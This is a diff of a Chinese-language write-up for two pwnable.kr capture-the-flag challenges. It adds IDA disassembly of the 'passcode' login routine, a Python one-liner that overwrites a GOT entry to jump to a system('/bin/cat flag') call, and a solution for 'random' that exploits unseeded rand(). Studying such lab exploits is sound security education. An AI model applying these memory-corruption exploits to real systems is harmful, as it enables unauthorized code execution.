@@ -206,22 +206,108 @@ unsigned int welcome()
 .plt:08048420
 ```
 ```text
-.plt:08048460 ; =============== S U B R O U T I N E =======================================
-.plt:08048460
-.plt:08048460 ; Attributes: thunk
-.plt:08048460
-.plt:08048460 ; int system(const char *command)
-.plt:08048460 _system         proc near               ; CODE XREF: login+86↓p
-.plt:08048460
-.plt:08048460 command         = dword ptr  4
-.plt:08048460
-.plt:08048460                 jmp     ds:off_804A010
-.plt:08048460 _system         endp
-.plt:08048460
+.text:08048562 ; ---------------------------------------------------------------------------
+.text:08048563                 align 4
+.text:08048564
+.text:08048564 ; =============== S U B R O U T I N E =======================================
+.text:08048564
+.text:08048564 ; Attributes: bp-based frame
+.text:08048564
+.text:08048564                 public login
+.text:08048564 login           proc near               ; CODE XREF: main+1A↓p
+.text:08048564
+.text:08048564 var_10          = dword ptr -10h
+.text:08048564 var_C           = dword ptr -0Ch
+.text:08048564
+.text:08048564 ; __unwind {
+.text:08048564                 push    ebp
+.text:08048565                 mov     ebp, esp
+.text:08048567                 sub     esp, 28h
+.text:0804856A                 mov     eax, offset format ; "enter passcode1 : "
+.text:0804856F                 mov     [esp], eax      ; format
+.text:08048572                 call    _printf
+.text:08048577                 mov     eax, offset aD  ; "%d"
+.text:0804857C                 mov     edx, [ebp+var_10]
+.text:0804857F                 mov     [esp+4], edx
+.text:08048583                 mov     [esp], eax
+.text:08048586                 call    ___isoc99_scanf
+.text:0804858B                 mov     eax, ds:stdin@@GLIBC_2_0
+.text:08048590                 mov     [esp], eax      ; stream
+.text:08048593                 call    _fflush
+.text:08048598                 mov     eax, offset aEnterPasscode2 ; "enter passcode2 : "
+.text:0804859D                 mov     [esp], eax      ; format
+.text:080485A0                 call    _printf
+.text:080485A5                 mov     eax, offset aD  ; "%d"
+.text:080485AA                 mov     edx, [ebp+var_C]
+.text:080485AD                 mov     [esp+4], edx
+.text:080485B1                 mov     [esp], eax
+.text:080485B4                 call    ___isoc99_scanf
+.text:080485B9                 mov     dword ptr [esp], offset s ; "checking..."
+.text:080485C0                 call    _puts
+.text:080485C5                 cmp     [ebp+var_10], 528E6h
+.text:080485CC                 jnz     short loc_80485F1
+.text:080485CE                 cmp     [ebp+var_C], 0CC07C9h
+.text:080485D5                 jnz     short loc_80485F1
+.text:080485D7                 mov     dword ptr [esp], offset aLoginOk ; "Login OK!"
+.text:080485DE                 call    _puts
+.text:080485E3                 mov     dword ptr [esp], offset command ; "/bin/cat flag"
+.text:080485EA                 call    _system
+.text:080485EF                 leave
+.text:080485F0                 retn
 ```
+
+0x080485e3=134514147
 ### 实现:
 ```python
 python -c 'print "A"*96+"\x00\xa0\x04\x08"+"134514147\n"' | ./passcode
 
 ```
+## 6 random
+```c
+#include <stdio.h>
+
+
+int main(){
+
+        unsigned int random;
+
+        random = rand();        // random value!
+
+  
+
+        unsigned int key=0;
+
+        scanf("%d", &key);
+
+  
+
+        if( (key ^ random) == 0xdeadbeef ){
+
+                printf("Good!\n");
+
+                system("/bin/cat flag");
+
+                return 0;
+
+        }
+
+  
+
+        printf("Wrong, maybe you should try 2^32 cases.\n");
+
+        return 0;
+
+}
+```
+注意到`rand()`没有用`srand()`设定种子, 那么种子默认为1, 生成的随机数应该是一个固定的序列. 
+我们在本地编译, 用gdb调试该程序, 得到random的值为1804289383. 
+而key^random的值应该是0xdeadbeef, 由于^的逆运算是它本身, deadbeef^random=key.
+算出key = -1255736440, 运行random程序输入key得到flag
+```text
+random@pwnable:~$ ./random
+-1255736440
+Good!
+Mommy, I thought libc random is unpredictable...
+```
+
 
